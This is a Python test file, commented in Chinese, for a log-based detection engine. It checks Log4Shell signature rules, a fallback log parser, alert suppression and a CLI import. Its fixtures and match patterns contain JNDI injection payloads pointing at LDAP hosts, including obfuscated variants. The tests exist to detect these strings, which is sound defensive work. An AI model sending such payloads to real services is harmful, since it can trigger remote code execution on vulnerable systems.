"""v1.0 组件测试：Log4Shell 检测规则（signature matching）。

样本 tests/sample_app.log 的攻击行全部来自 cve-research/CVE-2021-44228-log4shell/
复现过程的真实捕获（实验 A/B/C/D 的受害应用日志），正常行是构造的测试陪衬。

覆盖：
1. 通用日志解析器（app_log.py）：ISO 时间戳提取 / IP 提取 / 保底不丢行
2. 规则引擎签名匹配（_matches）：raw_contains（AND）/ raw_contains_any（OR）
3. Log4Shell 四条规则的端到端检出与静默行为
4. CLI：import --format app 全链路
"""
from datetime import datetime
from pathlib import Path

import pytest

from cli import main
from collectors.app_log import parse_file, parse_line
from engine.detector import Rule, _build_rule, _matches, load_rules, run_rules
from models import Alert, AuthEvent

_ROOT = Path(__file__).parent.parent
_RULES = _ROOT / "rules" / "log4shell.yaml"
_SAMPLE = Path(__file__).parent / "sample_app.log"


@pytest.fixture()
def rules():
    return load_rules(_RULES)


@pytest.fixture()
def events():
    return parse_file(_SAMPLE)


# ================= 通用日志解析器 =================

def test_app_log_parses_iso_timestamp_and_ip():
    ev = parse_line('2026-10-23T02:45:19,213 [HTTP-Dispatcher] INFO App - '
                    'GET / UA=${jndi:ldap://10.0.0.9:1389/x}')
    assert ev is not None
    assert ev.event_type == "app_log"
    # 毫秒被截断到秒：与 storage 的 timespec="seconds" 一致
    assert ev.ts == datetime(2026, 10, 23, 2, 45, 19)
    assert ev.ip == "10.0.0.9"          # 行内 IP 被提取（便于按来源聚合）
    assert "${jndi:" in ev.raw          # 原始行完整保留（签名匹配的载体）


def test_app_log_never_drops_lines():
    """保底解析器：看不懂的行也要成为事件（覆盖率优先）。"""
    ev = parse_line("这是一行完全没见过的格式 ???")
    assert ev is not None and ev.event_type == "app_log"
    assert parse_line("") is None       # 空行除外
    assert parse_line("   \n") is None


def test_app_log_fallback_timestamp():
    """无时间戳的行退回当前时间（保底解析器的已知取舍）。"""
    before = datetime.now()
    ev = parse_line("no timestamp here")
    assert ev.ts >= before.replace(microsecond=0)


# ================= 签名匹配算子 =================

def _event(raw: str) -> AuthEvent:
    return AuthEvent(ts=datetime(2026, 10, 23, 9, 0, 0),
                     event_type="app_log", raw=raw)


def test_matches_raw_contains_is_and():
    m = {"raw_contains": ["${jndi:", "ldap:"]}
    assert _matches(_event("UA=${jndi:ldap://x/y}"), m) is True
    assert _matches(_event("UA=${jndi:http://x}"), m) is False   # 缺一个子串即不匹配


def test_matches_raw_contains_any_is_or():
    m = {"raw_contains_any": ["${lower:j", "${::-j"]}
    assert _matches(_event("x=${::-j}ndi:ldap://y"), m) is True
    assert _matches(_event("x=${lower:j}ndi:ldap://y"), m) is True
    assert _matches(_event("plain text"), m) is False


def test_matches_empty_conditions_pass():
    assert _matches(_event("anything"), {}) is True


def test_rule_match_field_optional_and_parsed():
    with_match = _build_rule({"id": "r1", "name": "n", "event_types": ["app_log"],
                              "group_by": ["ip"], "window_seconds": 60,
                              "threshold": 1, "match": {"raw_contains": ["x"]}})
    assert with_match.match == {"raw_contains": ["x"]}
    without = _build_rule({"id": "r2", "name": "n", "event_types": ["app_log"],
                           "group_by": ["ip"], "window_seconds": 60, "threshold": 1})
    assert without.match is None       # v0.x 的旧规则不受影响（向后兼容）


# ================= Log4Shell 规则端到端 =================

def test_log4shell_rules_detect_all_attack_lines(events, rules):
    alerts = run_rules(events, rules)
    fired = {a.rule_id for a in alerts}

    # 四条规则中三条命中（样本里没有混淆变体行，属预期）
    assert "log4shell-jndi-payload" in fired            # critical
    assert "log4shell-jndi-ldapctx-residue" in fired    # high
    assert "log4shell-jndi-deserialized" in fired       # high
    assert "log4shell-jndi-obfuscated" not in fired

    # 正常行（kube-probe / benign-check / python-requests / search）不产生任何告警
    benign = {"kube-probe", "benign-check", "python-requests", "search?q=log4j"}
    for a in alerts:
        assert not any(b in a.detail for b in benign)

    # 严重度：payload 是 critical，残留是 high
    sev = {a.rule_id: a.severity for a in alerts}
    assert sev["log4shell-jndi-payload"] == "critical"
    assert sev["log4shell-jndi-ldapctx-residue"] == "high"
    assert sev["log4shell-jndi-deserialized"] == "high"


def test_log4shell_payload_alert_suppressed_within_window(events, rules):
    """两条 payload 相距 11 分钟：suppress_seconds=600 只压住窗内的，
    超窗的第二条必须再报——阈值检测的静默不是"永不告警"。"""
    alerts = [a for a in run_rules(events, rules)
              if a.rule_id == "log4shell-jndi-payload"]
    assert len(alerts) == 2
    assert alerts[0].window_start < alerts[1].window_start


def test_log4shell_residue_alert_suppressed(events, rules):
    """三条 LdapCtx 残落在 5 分钟内：threshold=1 → 首个匹配即告警，
    suppress 600s 把后两条折叠（告警风暴防护）。

    已知取舍（面试可讲）：当前引擎不把静默期内的同类匹配计数合并进
    已发出的告警——Wazuh 的 frequency 字段会记录被抑制次数，我们选择
    "告警不合并、事件全留存"：3 条触达全部在 events 表里，分析师可下钻，
    告警侧保持"一次攻击一条告警"的简洁。
    """
    alerts = [a for a in run_rules(events, rules)
              if a.rule_id == "log4shell-jndi-ldapctx-residue"]
    assert len(alerts) == 1
    assert alerts[0].event_count == 1      # 触发时的窗口（首个匹配）
    # 三条触达事件本身都进了 events 表（可下钻）
    residue = [e for e in events if "com.sun.jndi.ldap.LdapCtx@" in e.raw]
    assert len(residue) == 3


def test_log4shell_payload_ip_attribution(events, rules):
    """payload 行里的 ldap://127.0.0.1 被提取为来源 IP——攻击指标可归因。"""
    alerts = [a for a in run_rules(events, rules)
              if a.rule_id == "log4shell-jndi-payload"]
    assert all(a.source_ip == "127.0.0.1" for a in alerts)


# ================= CLI 全链路 =================

def test_cli_import_app_format(tmp_path, capsys):
    db = tmp_path / "app.db"
    rc = main(["import", "--log", str(_SAMPLE), "--format", "app",
               "--db", str(db), "--reset"])
    assert rc == 0
    out = capsys.readouterr().out
    assert "解析事件 10 条" in out
    assert "Log4Shell JNDI 注入载荷" in out       # critical 告警出现在输出里
